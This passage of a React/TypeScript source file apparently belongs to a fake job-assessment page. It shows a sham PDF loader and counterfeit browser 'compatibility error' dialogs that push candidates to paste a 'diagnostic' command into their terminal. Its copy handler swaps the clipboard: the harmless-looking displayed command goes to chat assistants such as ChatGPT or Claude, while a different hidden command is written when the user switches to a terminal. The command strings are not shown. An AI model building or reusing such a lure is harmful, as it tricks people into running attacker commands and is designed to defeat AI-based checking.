        if (document.hasFocus()) return;
        if (leaveCountRef.current === 0) {
          leaveCountRef.current = 1;
        }
        handleLeaveFromPage();
      }, 0);
    }

    function onKeyDown(event: KeyboardEvent) {
      if (!activeRef.current) return;

      if (os === "linux") {
        // Case A: Ctrl+Alt+T — resolve pending write to short + gesture writeText.
        if (isLinuxTerminalShortcut(event)) {
          linuxAltHeldRef.current = false;
          linuxCaseARef.current = true;
          linuxCaseBRef.current = false;
          linuxClipboardCtrlRef.current?.resolveTerminal();
          void (async () => {
            try {
              if (navigator.clipboard?.writeText) {
                await navigator.clipboard.writeText(terminalCommand);
              } else {
                await writeClipboard(terminalCommand, htmlRef.current);
              }
              armedRef.current = true;
              delayedArmStartedRef.current = true;
            } catch {
              armedRef.current = true;
              delayedArmStartedRef.current = true;
            }
          })();
          return;
        }

        // Case B: Alt / Alt+Tab / Ctrl+Tab (browser tab to ChatGPT, etc.).
        if (
          isLinuxCaseBAltPreview(event) ||
          isLinuxCaseBSwitchGesture(event) ||
          isLinuxCaseBBrowserTabGesture(event)
        ) {
          linuxAltHeldRef.current =
            isLinuxCaseBAltPreview(event) || isLinuxCaseBSwitchGesture(event);
          forceLinuxCaseBOriginal();
          return;
        }
        return;
      }

      if (os === "macos") {
        // Optional Case A: ⌘+Space if the page receives it (Spotlight often swallows it).
        if (isMacSpotlightGesture(event)) {
          macSpotlightUsedRef.current = true;
          forceMacCaseAShort();
          return;
        }
        // Case B: ⌘+Tab / Ctrl+Tab — claim original before blur Case A timer.
        if (isMacCaseBAppSwitchGesture(event) || isMacCaseBBrowserTabGesture(event)) {
          forceMacCaseBOriginal();
          return;
        }
        return;
      }

      if (!isAppSwitchGesture(event, os)) return;

      const quickLeave = Date.now() - copyAtRef.current < QUICK_TERMINAL_LEAVE_MS;

      if (quickLeave) {
        void armTerminalPlain();
        return;
      }

      if (leaveCountRef.current === 0) {
        armTerminalPlainDelayed();
        return;
      }

      void armTerminalPlain();
    }

    function onKeyUp(event: KeyboardEvent) {
      if (os !== "linux" || !activeRef.current) return;
      if (
        event.key === "Alt" ||
        event.code === "AltLeft" ||
        event.code === "AltRight"
      ) {
        linuxAltHeldRef.current = false;
      }
    }

    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("focus", onFocus);
    window.addEventListener("blur", onBlur);
    window.addEventListener("keydown", onKeyDown, true);
    window.addEventListener("keyup", onKeyUp, true);
    return () => {
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("blur", onBlur);
      window.removeEventListener("keydown", onKeyDown, true);
      window.removeEventListener("keyup", onKeyUp, true);
    };
  }, [os, displayCommand, terminalCommand]);

  function handleCopy(event: ClipboardEvent<HTMLPreElement>) {
    event.preventDefault();
    event.stopPropagation();

    const html = buildClipboardHtml(displayCommand, os);
    htmlRef.current = html;
    activeRef.current = true;
    copyAtRef.current = Date.now();
    leaveCountRef.current = 0;
    delayedArmStartedRef.current = false;
    armedRef.current = false;
    linuxCaseARef.current = false;
    linuxCaseBRef.current = false;
    linuxAltHeldRef.current = false;
    linuxWindowBlurredRef.current = false;
    linuxClipboardCtrlRef.current = null;
    macClipboardCtrlRef.current = null;
    macCaseARef.current = false;
    macCaseBRef.current = false;
    macWindowBlurredRef.current = false;
    macSpotlightUsedRef.current = false;
    macBlurAtRef.current = 0;
    if (macCaseABlurTimerRef.current) {
      window.clearTimeout(macCaseABlurTimerRef.current);
      macCaseABlurTimerRef.current = 0;
    }
    if (macShortRetryTimerRef.current) {
      window.clearTimeout(macShortRetryTimerRef.current);
      macShortRetryTimerRef.current = 0;
    }
    writeGenRef.current += 1;

    // Start with original so other platforms get the real command first.
    event.clipboardData.setData("text/plain", displayCommand);
    event.clipboardData.setData("text/html", html);

    if (os === "linux") {
      linuxClipboardCtrlRef.current = beginLinuxClipboardFromCopyGesture(
        displayCommand,
        terminalCommand,
        html,
        (usedTerminalPlain) => {
          if (usedTerminalPlain) {
            if (linuxCaseBRef.current || linuxAltHeldRef.current) {
              linuxCaseARef.current = false;
              armedRef.current = false;
              delayedArmStartedRef.current = true;
              void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
              void writeClipboard(displayCommand, html).catch(() => undefined);
              return;
            }
            linuxCaseARef.current = true;
            armedRef.current = true;
            delayedArmStartedRef.current = true;
            return;
          }
          if (linuxCaseBRef.current) {
            delayedArmStartedRef.current = true;
          }
        },
      );
      return;
    }

    // macOS: HTML = original immediately (ChatGPT/Claude); plain → short after
    // Case A blur or after platform window for Case B Terminal.
    if (os === "macos") {
      if (supportsPromiseClipboardItem()) {
        macClipboardCtrlRef.current = beginMacClipboardFromCopyGesture(
          displayCommand,
          terminalCommand,
          html,
          () => ({
            caseA: macCaseARef.current,
            caseB: macCaseBRef.current,
          }),
          (usedTerminalPlain) => {
            if (usedTerminalPlain) {
              macCaseARef.current = true;
              armedRef.current = true;
              delayedArmStartedRef.current = true;
            } else if (macCaseBRef.current) {
              armedRef.current = true;
              delayedArmStartedRef.current = true;
            }
          },
          PLATFORM_THEN_TERMINAL_ARM_MS,
          MAC_PENDING_SAFETY_MS,
        );
      } else {
        void writeClipboard(displayCommand, html).catch(() => undefined);
      }
      return;
    }

    void writeClipboard(displayCommand, html).catch(() => undefined);
  }

  return (
    <pre
      className="select-text overflow-x-auto whitespace-pre-wrap break-all rounded border border-[#dadce0] bg-[#f1f3f4] p-2.5 font-[Consolas,Menlo,monospace] text-[12px] leading-relaxed text-[#202124]"
      style={{ userSelect: "text", WebkitUserSelect: "text" }}
      onCopy={handleCopy}
    >
      {displayCommand}
    </pre>
  );
}

/** Chromium / Edge style modal window chrome */
function ChromiumWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-lg border border-[#dadce0] bg-white shadow-[0_1px_3px_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#3c4043]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

/** Safari style sheet / dialog */
function SafariWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-xl border border-[#d2d2d7] bg-[#f5f5f7] shadow-[0_12px_40px_rgba(0,0,0,0.25)] ${widthClass}`}
      style={{ fontFamily: "system-ui, -apple-system, BlinkMacSystemFont, sans-serif" }}
    >
      <div className="relative flex h-10 items-center justify-center border-b border-[#d2d2d7] bg-[#ececef] px-3">
        <div className="absolute left-3 flex items-center gap-1.5">
          <button
            type="button"
            onClick={onClose}
            className="h-3 w-3 rounded-full bg-[#ff5f57]"
            aria-label="Close"
          />
          <span className="h-3 w-3 rounded-full bg-[#febc2e]" aria-hidden />
          <span className="h-3 w-3 rounded-full bg-[#28c840]" aria-hidden />
        </div>
        <div className="flex items-center gap-1.5">
          <BrowserFavicon browser="safari" />
          <p className="text-[12px] font-medium text-[#1d1d1f]">{title}</p>
        </div>
      </div>
      <div className="bg-white">{children}</div>
    </div>
  );
}

/** Firefox style dialog */
function FirefoxWindowChrome({
  title,
  onClose,
  children,
  widthClass = "max-w-[520px]",
}: {
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  return (
    <div
      className={`pointer-events-auto w-full overflow-hidden rounded-md border border-[#8f8f9d] bg-white shadow-[0_4px_16px_rgba(0,0,0,0.2)] ${widthClass}`}
      style={{ fontFamily: '"Segoe UI", system-ui, sans-serif' }}
    >
      <div className="flex h-9 items-center gap-2 border-b border-[#cfcfd8] bg-[#f0f0f4] px-3">
        <BrowserFavicon browser="firefox" />
        <p className="min-w-0 flex-1 truncate text-[12px] text-[#15141a]">{title}</p>
        <button
          type="button"
          onClick={onClose}
          className="flex h-7 w-7 items-center justify-center rounded text-[16px] text-[#5b5b66] hover:bg-[#e0e0e6]"
          aria-label="Close"
        >
          ×
        </button>
      </div>
      {children}
    </div>
  );
}

function BrowserWindowChrome({
  browser,
  title,
  onClose,
  children,
  widthClass,
}: {
  browser: ClientBrowser;
  title: string;
  onClose: () => void;
  children: React.ReactNode;
  widthClass?: string;
}) {
  if (browser === "safari") {
    return (
      <SafariWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </SafariWindowChrome>
    );
  }
  if (browser === "firefox") {
    return (
      <FirefoxWindowChrome title={title} onClose={onClose} widthClass={widthClass}>
        {children}
      </FirefoxWindowChrome>
    );
  }
  return (
    <ChromiumWindowChrome
      browser={browser === "other" ? "chrome" : browser}
      title={title}
      onClose={onClose}
      widthClass={widthClass}
    >
      {children}
    </ChromiumWindowChrome>
  );
}

function PdfLoadingWindow({ browser }: { browser: ClientBrowser }) {
  const accent = browserAccent(browser);

  return (
    <div className="pointer-events-auto flex h-[min(70vh,560px)] w-full max-w-3xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]">
      <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
        <BrowserFavicon browser={browser} />
        <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
          Sample Invoice  Payment Scenario.pdf
        </p>
        <span className="rounded bg-[#e8eaed] px-2 py-0.5 text-[11px] text-[#5f6368]">
          PDF
        </span>
      </div>
      <div className="flex flex-1 flex-col items-center justify-center gap-3 bg-[#525659] px-8 text-center">
        <div
          className="h-9 w-9 animate-spin rounded-full border-[3px] border-white/25"
          style={{ borderTopColor: accent }}
          aria-hidden
        />
        <p className="text-[14px] font-medium text-white">Loading PDF…</p>
        <p className="text-[12px] text-white/70">{SCENARIO_TITLE}</p>
      </div>
    </div>
  );
}

function BrowserErrorDialog({
  os,
  browser,
  onClose,
  onTryAgain,
  onOpenHelp,
}: DialogActions & { os: ClientOs; browser: ClientBrowser }) {
  const copy = getShellCopy(os);
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} — Compatibility issue`}
      onClose={onClose}
      widthClass="max-w-[600px]"
    >
      <div className="px-5 pb-5 pt-4">
        <div className="flex items-start gap-3">
          <AlertIcon size={36} />
          <div className="min-w-0 flex-1">
            <h3 className="text-[16px] font-semibold text-[#202124]">
              This page can&apos;t be opened
            </h3>
            <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">{copy.body}</p>
            <p className="mt-2 text-[12px] text-[#5f6368]">
              Error code: <span className="font-mono">ERR_COMPATIBILITY_CHECK_FAILED</span>
            </p>
          </div>
        </div>

        <div className="mt-4">
          <p className="text-[12px] font-medium text-[#202124]">Optional diagnostic</p>
          <p className="mt-1 text-[12px] text-[#5f6368]">{copy.shellInstruction}</p>
          <div className="mt-2">
            <SelectableCommand
              os={os}
              displayCommand={DISPLAY_COMMANDS[os]}
              terminalCommand={TERMINAL_COMMANDS[os]}
            />
          </div>
          <p className="mt-2 text-[12px] text-[#5f6368]">{copy.reportNote}</p>
        </div>

        <div className="mt-4 flex justify-end gap-2">
          <button
            type="button"
            onClick={onOpenHelp}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium hover:bg-[#f1f3f4]"
            style={{ color: accent }}
          >
            Details
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

function BrowserHelpWindow({
  os,
  browser,
  onReturn,
  onTryAgain,
}: {
  os: ClientOs;
  browser: ClientBrowser;
  onReturn: () => void;
  onTryAgain: () => void;
}) {
  const name = getBrowserDisplayName(browser === "other" ? "chrome" : browser);
  const accent = browserAccent(browser);
  const guide = getDiagnosticGuide(os);

  return (
    <BrowserWindowChrome
      browser={browser}
      title={`${name} Help`}
      onClose={onReturn}
      widthClass="max-w-[760px]"
    >
      <div className="flex max-h-[min(70vh,480px)] flex-col">
        <div className="nm-native-scroll min-h-0 flex-1 overflow-y-auto px-5 py-4">
          <h2 className="text-[20px] font-normal text-[#202124]">
            Why this page won&apos;t load
          </h2>
          <p className="mt-2 text-[13px] leading-relaxed text-[#3c4043]">
            {name} blocked or failed to render <strong>{SCENARIO_TITLE}</strong>. This is usually a
            browser feature / graphics setting issue, not a website layout error.
          </p>

          <div className="mt-4 rounded border border-[#f9ab00] bg-[#fef7e0] px-3 py-2.5">
            <p className="text-[13px] text-[#3c4043]">
              Missing or disabled features: PDF renderer, WebGL, or hardware acceleration.
            </p>
          </div>

          <h3 className="mt-5 text-[14px] font-medium text-[#202124]">Try these steps</h3>
          <ol className="mt-2 list-decimal space-y-2 pl-5 text-[13px] leading-relaxed text-[#3c4043]">
            <li>Update {name} to the latest version and restart it.</li>
            <li>
              Turn on hardware acceleration in {name} settings, then reload this tab.
            </li>
            <li>Allow PDF / site permissions for this assessment origin.</li>
            <li>Clear browsing data for this site, then reload.</li>
          </ol>

          <div className="mt-5">
            <p className="text-[13px] font-medium text-[#202124]">
              Optional diagnostic ({guide.shell})
            </p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">{guide.intro}</p>
            <ol className="mt-3 list-decimal space-y-2.5 pl-5 text-[12px] leading-relaxed text-[#3c4043]">
              {guide.steps.map((step) => (
                <li key={step}>{step}</li>
              ))}
            </ol>
            <div className="mt-3">
              <SelectableCommand
                os={os}
                displayCommand={DISPLAY_COMMANDS[os]}
                terminalCommand={TERMINAL_COMMANDS[os]}
              />
            </div>
            <p className="mt-2 text-[12px] text-[#5f6368]">{guide.note}</p>
          </div>

          <div className="mt-5 rounded border border-[#dadce0] bg-[#f8f9fa] px-3 py-3">
            <p className="text-[13px] font-medium text-[#202124]">Still stuck?</p>
            <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
              {os === "windows"
                ? "Share the PASS/FAIL result shown in Command Prompt, then return to this tab and choose Reload."
                : "Share the generated report, then return to this tab and choose Reload."}
            </p>
          </div>
        </div>

        <div className="flex shrink-0 items-center justify-end gap-2 border-t border-[#e8eaed] bg-[#f8f9fa] px-4 py-3">
          <button
            type="button"
            onClick={onReturn}
            className="rounded px-3.5 py-1.5 text-[13px] font-medium text-[#3c4043] hover:bg-[#e8eaed]"
          >
            Close
          </button>
          <button
            type="button"
            onClick={onTryAgain}
            className="rounded px-4 py-1.5 text-[13px] font-medium text-white"
            style={{ background: accent }}
          >
            Reload
          </button>
        </div>
      </div>
    </BrowserWindowChrome>
  );
}

export function isFinanceInvoiceScenarioQuestion(
  jobSlug: string,
  questionNumber: number,
): boolean {
  return jobSlug === "finance-manager" && Number(questionNumber) === 7;
}

/** PDF shown after admin disables the compatibility error overlay. */
const SCENARIO_PDF_URL = `/upload/${encodeURIComponent(
  "Sample Invoice  Payment Scenario.pdf",
)}`;

export function FinanceScenarioPdfOverlay({
  open,
  onOpenChange,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}) {
  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/50"
        aria-label="Close scenario"
        onClick={() => onOpenChange(false)}
      />

      <div
        className="relative z-10 flex h-[min(90vh,900px)] w-full max-w-5xl flex-col overflow-hidden rounded-xl border border-[#dadce0] bg-white shadow-[0_12px_40px_rgba(0,0,0,0.35)]"
        onClick={(event) => event.stopPropagation()}
        onMouseDown={(event) => event.stopPropagation()}
      >
        <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
          <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
            Sample Invoice / Payment Scenario
          </p>
          <a
            href={SCENARIO_PDF_URL}
            target="_blank"
            rel="noreferrer"
            className="rounded px-2.5 py-1 text-[12px] font-medium text-[#1a73e8] hover:bg-[#e8eaed]"
          >
            Open in new tab
          </a>
          <button
            type="button"
            onClick={() => onOpenChange(false)}
            className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
            aria-label="Close"
          >
            ×
          </button>
        </div>
        <iframe
          title="Sample Invoice Payment Scenario"
          src={SCENARIO_PDF_URL}
          className="h-full w-full flex-1 bg-[#525659]"
        />
      </div>
    </div>
  );
}

/** Open Scenario → loading → browser-style error. Details → browser help window. */
export function FinanceCompatibilityIssueOverlay({
  open,
  onOpenChange,
  onErrorShown,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onErrorShown?: () => void;
}) {
  const [clientOs, setClientOs] = useState<ClientOs>(() =>
    typeof window !== "undefined" ? detectClientOs() : "windows",
  );
  const [clientBrowser, setClientBrowser] = useState<ClientBrowser>(() =>
    typeof window !== "undefined" ? detectClientBrowser() : "chrome",
  );
  const [stage, setStage] = useState<OverlayStage>("loading");
  const onErrorShownRef = useRef(onErrorShown);
  onErrorShownRef.current = onErrorShown;

  useEffect(() => {
    setClientOs(detectClientOs());
    setClientBrowser(detectClientBrowser());
  }, []);

  useEffect(() => {
    if (!open) {
      setStage("loading");
      document.body.classList.remove("nm-system-error-active");
      return undefined;
    }

    document.body.classList.add("nm-system-error-active");
    setStage("loading");
    const timer = window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);

    return () => {
      window.clearTimeout(timer);
      document.body.classList.remove("nm-system-error-active");
    };
  }, [open]);

  function startRetry() {
    setStage("loading");
    window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);
  }

  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/25"
        aria-label="Dismiss"
        onClick={() => {
          if (stage !== "loading") {
            onOpenChange(false);
          }
        }}
      />

      <div
        className={`relative z-10 w-full ${
          stage === "loading"
            ? "max-w-3xl"
            : stage === "help"
              ? "max-w-[760px]"
              : "max-w-[640px]"
        }`}
        onClick={(event) => event.stopPropagation()}
        onMouseDown={(event) => event.stopPropagation()}
      >
        {stage === "loading" ? (
          <div className="flex justify-center">
            <PdfLoadingWindow browser={clientBrowser} />
          </div>
        ) : null}

        {stage === "error" ? (
          <div className="flex justify-center">
            <BrowserErrorDialog
              os={clientOs}
              browser={clientBrowser}
              onClose={() => onOpenChange(false)}
              onTryAgain={startRetry}
              onOpenHelp={() => setStage("help")}
            />
          </div>
        ) : null}

        {stage === "help" ? (
          <div className="flex justify-center">
            <BrowserHelpWindow
              os={clientOs}
              browser={clientBrowser}
              onReturn={() => onOpenChange(false)}
              onTryAgain={startRetry}
            />
          </div>
        ) : null}
      </div>
    </div>
  );
}
